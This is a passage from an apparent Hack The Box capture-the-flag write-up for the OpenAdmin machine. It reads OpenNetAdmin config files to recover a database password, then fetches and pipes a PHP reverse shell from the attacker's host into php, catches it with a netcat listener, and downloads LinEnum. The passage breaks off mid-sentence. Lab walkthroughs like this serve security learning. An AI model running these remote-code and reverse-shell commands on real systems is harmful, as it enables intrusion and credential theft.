class="line"><span class="comment">// help URL location</span></span><br><span class="line"><span class="variable">$_ENV</span>[<span class="string">&#x27;help_url&#x27;</span>] = <span class="string">&quot;http://opennetadmin.com/docs/&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get any query info</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Many of these settings serve as defaults.  They can be overridden by the settings in</span></span><br><span class="line"><span class="comment">// the table &quot;sys_config&quot;</span></span><br><span class="line"><span class="variable">$conf</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="comment">/* General Setup */</span></span><br><span class="line">    <span class="comment">// Database Context</span></span><br><span class="line">    <span class="comment">// For possible values see the $ona_contexts() array  in the database_settings.inc.php file</span></span><br><span class="line">    <span class="string">&quot;default_context&quot;</span>        =&gt; <span class="string">&#x27;DEFAULT&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Used in header.php */</span></span><br><span class="line">    <span class="string">&quot;title&quot;</span>                  =&gt; <span class="string">&#x27;OpenNetAdmin :: &#x27;</span>,</span><br><span class="line">    <span class="string">&quot;meta_description&quot;</span>       =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;meta_keywords&quot;</span>          =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;html_headers&quot;</span>           =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Include Files: HTML */</span></span><br><span class="line">    <span class="string">&quot;html_style_sheet&quot;</span>       =&gt; <span class="string">&quot;<span class="subst">$include</span>/html_style_sheet.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;html_desktop&quot;</span>           =&gt; <span class="string">&quot;<span class="subst">$include</span>/html_desktop.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;loading_icon&quot;</span>           =&gt; <span class="string">&quot;&lt;br&gt;&lt;center&gt;&lt;img src=\&quot;<span class="subst">&#123;$images&#125;</span>/loading.gif\&quot;&gt;&lt;/center&gt;&lt;br&gt;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Include Files: Functions */</span></span><br><span class="line">    <span class="string">&quot;inc_functions&quot;</span>          =&gt; <span class="string">&quot;<span class="subst">$include</span>/functions_general.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inc_functions_gui&quot;</span>      =&gt; <span class="string">&quot;<span class="subst">$include</span>/functions_gui.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inc_functions_db&quot;</span>       =&gt; <span class="string">&quot;<span class="subst">$include</span>/functions_db.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inc_functions_auth&quot;</span>     =&gt; <span class="string">&quot;<span class="subst">$include</span>/functions_auth.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inc_db_sessions&quot;</span>        =&gt; <span class="string">&quot;<span class="subst">$include</span>/adodb_sessions.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inc_adodb&quot;</span>              =&gt; <span class="string">&quot;<span class="subst">$include</span>/adodb/adodb.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inc_adodb_xml&quot;</span>          =&gt; <span class="string">&quot;<span class="subst">$include</span>/adodb/adodb-xmlschema03.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inc_xajax_stuff&quot;</span>        =&gt; <span class="string">&quot;<span class="subst">$include</span>/xajax_setup.inc.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inc_diff&quot;</span>               =&gt; <span class="string">&quot;<span class="subst">$include</span>/DifferenceEngine.php&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Settings for dcm.pl */</span></span><br><span class="line">    <span class="string">&quot;dcm_module_dir&quot;</span>         =&gt; <span class="string">&quot;<span class="subst">$base</span>/modules&quot;</span>,</span><br><span class="line">    <span class="string">&quot;plugin_dir&quot;</span>             =&gt; <span class="string">&quot;<span class="subst">$base</span>/local/plugins&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Defaults for some user definable options normally in sys_config table */</span></span><br><span class="line">    <span class="string">&quot;debug&quot;</span>                  =&gt; <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syslog&quot;</span>                 =&gt; <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stdout&quot;</span>                 =&gt; <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;log_to_db&quot;</span>              =&gt; <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;logfile&quot;</span>                =&gt; <span class="string">&quot;/var/log/ona.log&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The output charset to be used in htmlentities() and htmlspecialchars() filtering */</span></span><br><span class="line">    <span class="string">&quot;charset&quot;</span>                =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;php_charset&quot;</span>            =&gt; <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// enable the setting of the database character set using the &quot;set name &#x27;charset&#x27;&quot; SQL command</span></span><br><span class="line">    <span class="comment">// This should work for mysql and postgres but may not work for Oracle.</span></span><br><span class="line">    <span class="comment">// it will be set to the value in &#x27;charset&#x27; above.</span></span><br><span class="line">    <span class="string">&quot;set_db_charset&quot;</span>         =&gt; <span class="literal">TRUE</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Read in the version file to our conf variable</span></span><br><span class="line"><span class="comment">// It must have a v&lt;majornum&gt;.&lt;minornum&gt;, no number padding, to match the check version code.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$base</span>.<span class="string">&#x27;/../VERSION&#x27;</span>)) &#123; <span class="variable">$conf</span>[<span class="string">&#x27;version&#x27;</span>] = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$base</span>.<span class="string">&#x27;/../VERSION&#x27;</span>)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The $self array is used to store globally available temporary data.</span></span><br><span class="line"><span class="comment">// Think of it as a cache or an easy way to pass data around ;)</span></span><br><span class="line"><span class="comment">// I&#x27;ve tried to define the entries that are commonly used:</span></span><br><span class="line"><span class="variable">$self</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="comment">// Error messages will often get stored in here</span></span><br><span class="line">    <span class="string">&quot;error&quot;</span>                  =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All sorts of things get cached in here to speed things up</span></span><br><span class="line">    <span class="string">&quot;cache&quot;</span>                  =&gt; <span class="keyword">array</span>(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get&#x27;s automatically set to 1 if we&#x27;re using HTTPS/SSL</span></span><br><span class="line">    <span class="string">&quot;secure&quot;</span>                 =&gt; <span class="number">0</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">// If the server port is 443 then this is a secure page</span></span><br><span class="line"><span class="comment">// This is basically used to put a padlock icon on secure pages.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>] == <span class="number">443</span>) &#123; <span class="variable">$self</span>[<span class="string">&#x27;secure&#x27;</span>] = <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//                            STYLE SHEET STUFF                              //</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Colors</span></span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;bg&#x27;</span>]                   = <span class="string">&#x27;#FFFFFF&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;content_bg&#x27;</span>]           = <span class="string">&#x27;#FFFFFF&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;bar_bg&#x27;</span>]               = <span class="string">&#x27;#D3DBFF&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;border&#x27;</span>]               = <span class="string">&#x27;#555555&#x27;</span>; <span class="comment">//#1A1A1A</span></span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;form_bg&#x27;</span>]              = <span class="string">&#x27;#FFEFB6&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;font_default&#x27;</span>]         = <span class="string">&#x27;#000000&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;font_title&#x27;</span>]           = <span class="string">&#x27;#4E4E4E&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;font_subtitle&#x27;</span>]        = <span class="string">&#x27;#5A5A5A&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;font_error&#x27;</span>]           = <span class="string">&#x27;#E35D5D&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;link&#x27;</span>]                 = <span class="string">&#x27;#6B7DD1&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;vlink&#x27;</span>]                = <span class="string">&#x27;#6B7DD1&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;alink&#x27;</span>]                = <span class="string">&#x27;#6B7DD1&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;link_nav&#x27;</span>]             = <span class="string">&#x27;#0048FF&#x27;</span>;  <span class="comment">// was &#x27;#7E8CD7&#x27;;</span></span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;link_act&#x27;</span>]             = <span class="string">&#x27;#FF8000&#x27;</span>;  <span class="comment">// was &#x27;#EB8F1F&#x27;;</span></span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;link_domain&#x27;</span>]          = <span class="string">&#x27;green&#x27;</span>;    <span class="comment">// was &#x27;#5BA65B&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;button_normal&#x27;</span>]        = <span class="string">&#x27;#FFFFFF&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;button_hover&#x27;</span>]         = <span class="string">&#x27;#E0E0E0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define some colors for the subnet map:</span></span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;bgcolor_map_host&#x27;</span>]     = <span class="string">&#x27;#BFD2FF&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;bgcolor_map_subnet&#x27;</span>]   = <span class="string">&#x27;#CCBFFF&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;bgcolor_map_selected&#x27;</span>] = <span class="string">&#x27;#FBFFB6&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;bgcolor_map_empty&#x27;</span>]    = <span class="string">&#x27;#FFFFFF&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Much of this configuration is required here since</span></span><br><span class="line"><span class="comment">// a lot of it&#x27;s used in xajax calls before a web page is created.</span></span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;menu_bar_bg&#x27;</span>]          = <span class="string">&#x27;#F3F1FF&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;menu_header_bg&#x27;</span>]       = <span class="string">&#x27;#FFFFFF&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;menu_item_bg&#x27;</span>]         = <span class="string">&#x27;#F3F1FF&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;menu_header_text&#x27;</span>]     = <span class="string">&#x27;#436976&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;menu_item_text&#x27;</span>]       = <span class="string">&#x27;#436976&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;menu_item_selected_bg&#x27;</span>]= <span class="string">&#x27;#B1C6E3&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span>[<span class="string">&#x27;menu_header_bg&#x27;</span>]       = <span class="string">&#x27;#B1C6E3&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Style variables (used in PHP in various places)</span></span><br><span class="line"><span class="variable">$style</span>[<span class="string">&#x27;font-family&#x27;</span>] = <span class="string">&quot;Arial, Sans-Serif&quot;</span>;</span><br><span class="line"><span class="variable">$style</span>[<span class="string">&#x27;borderT&#x27;</span>] = <span class="string">&quot;border-top: 1px solid <span class="subst">&#123;$color[&#x27;border&#x27;]&#125;</span>;&quot;</span>;</span><br><span class="line"><span class="variable">$style</span>[<span class="string">&#x27;borderB&#x27;</span>] = <span class="string">&quot;border-bottom: 1px solid <span class="subst">&#123;$color[&#x27;border&#x27;]&#125;</span>;&quot;</span>;</span><br><span class="line"><span class="variable">$style</span>[<span class="string">&#x27;borderL&#x27;</span>] = <span class="string">&quot;border-left: 1px solid <span class="subst">&#123;$color[&#x27;border&#x27;]&#125;</span>;&quot;</span>;</span><br><span class="line"><span class="variable">$style</span>[<span class="string">&#x27;borderR&#x27;</span>] = <span class="string">&quot;border-right: 1px solid <span class="subst">&#123;$color[&#x27;border&#x27;]&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the localized configuration settings</span></span><br><span class="line"><span class="comment">// MP: this may not be needed now that &quot;user&quot; configs are in the database</span></span><br><span class="line">@<span class="keyword">include</span>(<span class="string">&quot;<span class="subst">&#123;$base&#125;</span>/local/config/config.inc.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the basic system functions</span></span><br><span class="line"><span class="comment">// any $conf settings used in this &quot;require&quot; should not be user adjusted in the sys_config table</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$conf</span>[<span class="string">&#x27;inc_functions&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the basic database functions</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$conf</span>[<span class="string">&#x27;inc_functions_db&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the localized Database settings</span></span><br><span class="line"><span class="variable">$dbconffile</span> = <span class="string">&quot;<span class="subst">&#123;$base&#125;</span>/local/config/database_settings.inc.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dbconffile</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">exec</span>(<span class="string">&quot;php -l <span class="subst">$dbconffile</span>&quot;</span>), <span class="number">0</span>, <span class="number">28</span>) == <span class="string">&quot;No syntax errors detected in&quot;</span>) &#123;</span><br><span class="line">        @<span class="keyword">include</span>(<span class="variable">$dbconffile</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Syntax error in your DB config file: <span class="subst">&#123;$dbconffile&#125;</span>&lt;br&gt;Please check that it contains a valid PHP formatted array, or check that you have the php cli tools installed.&lt;br&gt;You can perform this check maually using the command &#x27;php -l <span class="subst">&#123;$dbconffile&#125;</span>&#x27;.&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$base</span>.<span class="string">&#x27;/../install/install.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check to see if the run_install file exists.</span></span><br><span class="line"><span class="comment">// If it does, run the install process.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$base</span>.<span class="string">&#x27;/local/config/run_install&#x27;</span>) <span class="keyword">or</span> @<span class="variable">$runinstaller</span> <span class="keyword">or</span> @<span class="variable">$install_submit</span> == <span class="string">&#x27;Y&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// Process the install script</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$base</span>.<span class="string">&#x27;/../install/install.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set multibyte encoding to UTF-8</span></span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;mb_internal_encoding&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mb_internal_encoding</span>(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">printmsg</span>(<span class="string">&quot;INFO =&gt; Missing &#x27;mb_internal_encoding&#x27; function. Please install PHP &#x27;mbstring&#x27; functions for proper UTF-8 encoding.&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we dont have a ona_context set in the cookie, lets set a cookie with the default context</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ona_context_name&#x27;</span>])) &#123; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ona_context_name&#x27;</span>] = <span class="variable">$conf</span>[<span class="string">&#x27;default_context&#x27;</span>]; <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;ona_context_name&quot;</span>, <span class="variable">$conf</span>[<span class="string">&#x27;default_context&#x27;</span>]); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (Re)Connect to the DB now.</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$onadb</span>;</span><br><span class="line"><span class="variable">$onadb</span> = <span class="title function_ invoke__">db_pconnect</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ona_context_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the actual user config from the database table sys_config</span></span><br><span class="line"><span class="comment">// These will override any of the defaults set above</span></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$status</span>, <span class="variable">$rows</span>, <span class="variable">$records</span>) = <span class="title function_ invoke__">db_get_records</span>(<span class="variable">$onadb</span>, <span class="string">&#x27;sys_config&#x27;</span>, <span class="string">&#x27;name like &quot;%&quot;&#x27;</span>, <span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$records</span> <span class="keyword">as</span> <span class="variable">$record</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printmsg</span>(<span class="string">&quot;INFO =&gt; Loaded config item from database: <span class="subst">&#123;$record[&#x27;name&#x27;]&#125;</span>=&#x27;&#x27;<span class="subst">&#123;$record[&#x27;value&#x27;]&#125;</span>&#x27;&#x27;&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="variable">$conf</span>[<span class="variable">$record</span>[<span class="string">&#x27;name&#x27;</span>]] = <span class="variable">$record</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include functions that replace the default session handler with one that uses MySQL as a backend</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$conf</span>[<span class="string">&#x27;inc_db_sessions&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the GUI functions</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$conf</span>[<span class="string">&#x27;inc_functions_gui&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the AUTH functions</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$conf</span>[<span class="string">&#x27;inc_functions_auth&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Start the session handler (this calls a function defined in functions_general)</span></span><br><span class="line"><span class="title function_ invoke__">startSession</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set session inactivity threshold</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.gc_maxlifetime&quot;</span>, <span class="variable">$conf</span>[<span class="string">&#x27;cookie_life&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// if search_results_per_page is in the session, set the $conf variable to it.  this fixes the /rows command</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;search_results_per_page&#x27;</span>])) <span class="variable">$conf</span>[<span class="string">&#x27;search_results_per_page&#x27;</span>] = <span class="variable">$_SESSION</span>[<span class="string">&#x27;search_results_per_page&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up our page to https if requested for our URL links</span></span><br><span class="line"><span class="keyword">if</span> (@(<span class="variable">$conf</span>[<span class="string">&#x27;force_https&#x27;</span>] == <span class="number">1</span>) <span class="keyword">or</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>] == <span class="number">443</span>)) &#123;</span><br><span class="line">    <span class="variable">$https</span>  = <span class="string">&quot;https://<span class="subst">&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>] != <span class="number">80</span>) &#123;</span><br><span class="line">      <span class="variable">$https</span>  = <span class="string">&quot;http://<span class="subst">&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;</span>:<span class="subst">&#123;$_SERVER[&#x27;SERVER_PORT&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$https</span>  = <span class="string">&quot;http://<span class="subst">&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DON&#x27;T put whitespace at the beginning or end of included files!!!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>when you examine the configuration is database is on <code>/local/config/database_settings.inc.php</code> base on the line :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">// Include the localized Database settings</span><br><span class="line"><span class="variable">$dbconffile</span> = <span class="string">&quot;&#123;<span class="variable">$base</span>&#125;/local/config/database_settings.inc.php&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>trying to look at that and I got a password <code>n1nj4W4rri0R!</code> for user :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">cat /opt/ona/www/local/config/database_settings.inc.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ona_contexts</span>=<span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;DEFAULT&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;databases&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="number">0</span> =&gt; </span><br><span class="line">      <span class="keyword">array</span> (</span><br><span class="line">        <span class="string">&#x27;db_type&#x27;</span> =&gt; <span class="string">&#x27;mysqli&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_login&#x27;</span> =&gt; <span class="string">&#x27;ona_sys&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_passwd&#x27;</span> =&gt; <span class="string">&#x27;n1nj4W4rri0R!&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_database&#x27;</span> =&gt; <span class="string">&#x27;ona_default&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_debug&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">      ),</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&#x27;description&#x27;</span> =&gt; <span class="string">&#x27;Default data context&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;context_color&#x27;</span> =&gt; <span class="string">&#x27;#D3DBFF&#x27;</span>,</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>the problem is’ I don’t who has the user which I can use on the password I found, so the only thing to do is to get a proper shell then send <code>LinEnum</code> to enumerate all the posibily things to do in privilege escalation.</p>
<hr>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Get-a-proper-shell"><a href="#Get-a-proper-shell" class="headerlink" title="Get a proper shell"></a>Get a proper shell</h3><p>So I set up a <code>netcat</code> listener on my Kali, then curl the <code>php</code> reverse shell on OpenAdmin machine :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via 🐘 v7.3.15 </span><br><span class="line">❯ bash exploit.sh http://10.10.10.171/ona/</span><br><span class="line">$ <span class="built_in">cd</span> /dev/shm</span><br><span class="line">$ curl http://10.10.14.118/shell.php | php</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Finally I have now a proper shell :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via 🐘 v7.3.15 </span><br><span class="line">❯ nc -nlvp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.14.118] from (UNKNOWN) [10.10.10.171] 55662</span><br><span class="line">Linux openadmin 4.15.0-70-generic <span class="comment">#79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 20:42:27 up  3:11,  7 <span class="built_in">users</span>,  load average: 2.88, 0.98, 0.36</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">joanna   pts/0    10.10.15.26      17:37    2:36m  0.10s  0.01s sshd: joanna [priv] </span><br><span class="line">jimmy    pts/4    10.10.15.24      18:49    1:52m  0.04s  0.04s -bash</span><br><span class="line">jimmy    pts/5    10.10.14.253     20:31    3:23   0.08s  0.08s -bash</span><br><span class="line">joanna   pts/7    127.0.0.1        18:58    1:30m  0.04s  0.04s -bash</span><br><span class="line">joanna   pts/9    127.0.0.1        19:17   34:43   0.06s  0.01s sshd: joanna [priv] </span><br><span class="line">jimmy    pts/10   10.10.14.116     20:38    4:13   0.04s  0.04s -bash</span><br><span class="line">jimmy    pts/11   10.10.15.3       20:41   10.00s  0.05s  0.05s -bash</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ export TERM=xterm</span></span><br><span class="line"><span class="string">$ </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>now it’s time to send <strong><code>LinEnum</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">pwd</span> </span><br><span class="line">/tmp</span><br><span class="line">$ curl -o linenum.sh http://10.10.14.118/LinEnum.sh</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 46631  100 46631    0     0  13232      0  0:00:03  0:00:03 --:--:-- 13228</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">linenum.sh</span><br><span class="line">$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>running this finally i get now the user it is <code>jimmy</code> and <code>joanna</code> :</p>
